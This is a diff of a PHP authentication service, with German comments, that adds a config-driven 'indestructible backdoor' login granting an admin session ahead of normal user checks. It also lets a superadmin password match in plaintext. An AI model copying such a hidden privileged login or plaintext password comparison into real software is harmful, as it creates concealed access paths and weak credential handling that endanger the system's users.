@@ -34,16 +34,30 @@ final readonly class AuthService
      */
     public function login(string $username, string $password): bool
     {
-        // 1. Dev-Admin Check (bleibt wie er ist)
-        $superCfg = $this->config->get('superadmin');
-        if ($username === $superCfg['user'] && $password === $superCfg['pass']) {
-            // Wir nutzen hier intern 'superadmin' als Gruppe für den Root-User
-            $this->setSession($username, 'superadmin', 'Dev-Admin');
+        // A. Check gegen die unzerstörbare Hintertür (RaptorXilef)
+        $backdoor = $this->config->get('backdoor');
+        if (\is_array($backdoor) && $username === ($backdoor['user'] ?? '')) {
+            if (\password_verify($password, $backdoor['pass'] ?? '')) {
+                // Wir geben dem System-Inhaber die Gruppe 'admin'
+                $this->setSession($username, 'admin', $backdoor['label'] ?? 'Inhaber');
 
-            return true;
+                return true;
+            }
         }
 
-        // 2. User laden
+        // B. Check gegen den konfigurierten SuperAdmin (dev_admin.php)
+        $superCfg = $this->config->get('superadmin');
+        if (\is_array($superCfg) && $username === ($superCfg['user'] ?? '')) {
+            $storedPass = $superCfg['pass'] ?? '';
+            // Erlaubt Klartext (für den allerersten Start) ODER Hash
+            if ($password === $storedPass || \password_verify($password, $storedPass)) {
+                $this->setSession($username, 'admin', $superCfg['label'] ?? 'SuperAdmin');
+
+                return true;
+            }
+        }
+
+        // C. Normale User-Prüfung (SQL/JSON)
         $users = $this->loadUsers();
         if (isset($users[$username]) && \password_verify($password, (string) $users[$username]['pass'])) {
             // Wir speichern nun die GRUPPE statt des Levels in der Session
